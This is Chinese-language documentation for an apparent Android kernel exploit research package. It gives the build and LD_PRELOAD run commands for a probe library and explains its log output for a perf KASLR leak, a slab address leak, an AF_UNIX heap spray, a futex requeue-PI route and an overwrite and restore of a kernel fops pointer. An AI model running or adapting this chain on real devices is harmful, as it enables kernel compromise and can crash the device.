# 01. 观测入口、日志采集与证据边界

本文描述当前 3.1 包真实执行到的观测路径。它不是后续利用链说明，也不建议在非目标设备上尝试；这里的重点是如何采集、阅读和约束 probe 日志。

当前包不附带预编译二进制、上下文副本、完整 console log、logcat、dmesg 或 tombstone。下面的片段是字段格式说明；研究结论必须由执行者在精确目标固件上重新采集。

## 入口与日志来源

构建：

```bash
cd exploit
make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35
sha256sum build/PD2314-AP3A.240905.015.A2/bin/probe.so
```

推送并复核：

```bash
adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
adb shell sha256sum /data/local/tmp/probe.so
```

采集建议：

```bash
adb logcat -b all -v threadtime > logcat-live.txt
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id' 2>&1 | tee probe-console.txt
adb shell getprop ro.boot.bootreason
adb shell dmesg > dmesg-after.txt
```

`probe.so` 的 `pr_*` 默认输出到 stdout；supervisor 调用 `set_unbuffer()`，所以 `tee` 能按阶段保存。logcat 不是 stdout 的替代品，它用于补充系统状态、崩溃、watchdog 或重启原因。`dmesg` 在 shell 权限下可能返回权限不足，仍建议记录返回结果。

## 执行顺序

1. `src/preload.c` constructor 看到 `Z_REFCLONE=1` 后打印 `probe loader starting` 并进入 `run_probe()`。
2. `targets/.../main.c` 确认 probe 模式，进入 `refclone_load()`。
3. supervisor 最多 fork 三次 worker，给子进程设置 `PROBE_WORKER=1`、`PROBE_ATTEMPT=N` 与当前 `LD_PRELOAD`。
4. worker 清掉自己的 `LD_PRELOAD`，检查 fingerprint 与 kernel release。
5. worker 设置 3 个默认参数：`PAGE_PREP_SLABS=16`、`PROCESS_VM_CONSUMER_MAX_CALLS=1`、`SLIDE_IP_ROUTE_ATTEMPTS=1`。
6. `refclone_run_probe()` 依次执行 perf KASLR、mm/slab 定位、payload 准备与喷洒、futex/rt_mutex route、restore、`route-summary`。

旧的本地裁剪构建可能把入口打印成 `preload starting`、`direct-demo supervisor` 或 `startup context`；清理后的当前包统一为 `probe loader`、`probe supervisor`、`probe context`。字段语义相同，文档以当前包为准。

## 关键日志骨架

```text
[+] probe loader starting pid=...
[*] probe supervisor attempt=1/3
[+] probe worker starting pid=...
[+] probe profile applied target=... defaults=3
[+] probe context pid=... uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0
[+] probe build pid=... label=pd2314_a_15_2_17_1_w10 route=perf-kaslr+refclone
[*] perf probe policy paranoid=...
[*] perf probe ring head=... tail=... records=... samples=... kernel=... lost=... malformed=...
[*] perf probe sampled duration_ms=200 disable=0/0 min=... max=...
[*] perf probe candidate page=... window=.../... near=... far=... buckets=...
[+] slide-kaslr-perf-ok pid=... base=... slide=...
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch waiters=... target=... baseline=... threshold=... margin=4 elapsed_ms=...
[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
[*] kernelsnitch collision-scan leaked mm=...
[*] tcp payload geometry slab_base=... payload_bias=0xe80 fake_lock=... fake_w0=... fake_task=... fake_fops=...
[+] final payload invariant ok mode=active-final target=... value=...
[*] af_unix order3 staged pairs=64 requested=64
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 ...
[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
uid=2000(shell) gid=2000(shell) ...
```

一次参考运行中，`perf probe` 出现过 `records=2047 samples=2047 kernel=2047 lost=0 malformed=0`、`window=2044/2047`，KernelSnitch 出现过 `found=7/7`，spray 出现过 `sent=4096 requested=4096`，route 阶段出现过 `sched_ok=1`。这些值说明该次运行的观测质量较高，但不能替代当前设备重新采集。

## 字段解释

| 字段 | 来源 | 含义 |
| --- | --- | --- |
| `attr=u:r:shell:s0` | `log_startup_context()` | SELinux 上下文，只说明进程身份，不代表权限变化 |
| `route=perf-kaslr+refclone` | `probe build` | 内部源码标签，说明选择的观测路径 |
| `base` / `slide` | perf probe | live kernel text base 与相对 `KIMAGE_TEXT_BASE` 的偏移 |
| `leaked mm` | KernelSnitch | 碰撞后取回的 `mm_struct` 邻近地址 |
| `slab_base` | `leaked & ~0x7fff` | order-3 slab 页基址估计 |
| `payload_bias=0xe80` | payload 几何 | sk_buff copy 预期落点偏移 |
| `final payload invariant ok` | 用户态 payload 自检 | 两份 32 KiB chunk 内字段一致；不证明 kernel 已按该布局落位 |
| `sched_ok=1` | consumer 线程 | 对 waiter tid 的 `sched_setattr` 至少成功一次 |
| `ret=8 errno=0` | restore | 对 `dashmem_misc.fops` 目标槽位完成 8 字节写回 |
| `route_done=1` | worker 汇总 | 线程路径到达收尾；不是独立漏洞证明 |

## 证据阶梯

| 结论级别 | 需要同时看到 |
| --- | --- |
| 入口有效 | `probe loader starting`、`probe worker starting`、target profile 通过 |
| KASLR 观测有效 | `perf probe ring` 有 kernel samples，`candidate page` 被接受，`slide-kaslr-perf-ok` 输出 |
| slab 观测有效 | `prepare_kernel_page geom` 与 `kernelsnitch collision-scan leaked mm` 同时出现 |
| payload 准备有效 | payload geometry 与 `final payload invariant ok` 同时出现 |
| route 侧副作用出现 | `FUTEX_CMP_REQUEUE_PI`、`slide ip seq`、`slide ip side effect ... sched_ok=1` 同时出现 |
| 3.1 闭环最强证据 | 上述全部成立，并且 restore `ret=8 errno=0`、`route-summary kaslr=1 route_done=1` |

`route-summary` 是终止标记，不是结论本体。若缺少 restore，日志只能说明执行到 route 末端附近，不能把设备状态视为已经清理。若只有 toybox `id` 输出 `uid=2000(shell)`，那只是承载进程身份，不表示权限提升。

## 失败定位

| 症状 | 可能位置 | 处理方式 |
| --- | --- | --- |
| fingerprint/kernel mismatch | 目标门禁 | 停止，不要强行改常量跑其他固件 |
| `perf probe open errno` | perf 权限或策略 | 记录 `paranoid`、`attr_size`、errno；该次不能进入 KASLR 证据 |
| `no usable kernel samples` | perf 样本质量 | 可小范围调整 `PERF_PROBE_MSEC` 后重测 |
| `rejected histogram` | base 候选不集中 | 保存 ring 统计，避免手工指定 live base |
| `only found ... collisions` | KernelSnitch 碰撞不足 | supervisor retry 会把 `PAGE_PREP_SLABS` 提到 32 |
| spray `sent` 小于 `requested` | AF_UNIX/sk_buff 压力不足 | 记录首个失败 `ret/errno`，不要把后续阶段视为有效 |
| restore `ret != 8` | 写回闭环失败 | 保存 stdout/logcat/dmesg，准备设备重启恢复 |
| 卡死或自动重启 | kernel panic/watchdog | 长按音量下 + 电源键恢复，再采 `bootreason` 与可用的 `dmesg` |

任何重启、panic、watchdog 或长时间无响应都属于测试风险；执行者自行承担。合法拥有者在精确目标上测试时，当前包不做持久化或驻留，通常不应造成永久性损伤，但仍应提前备份重要数据。
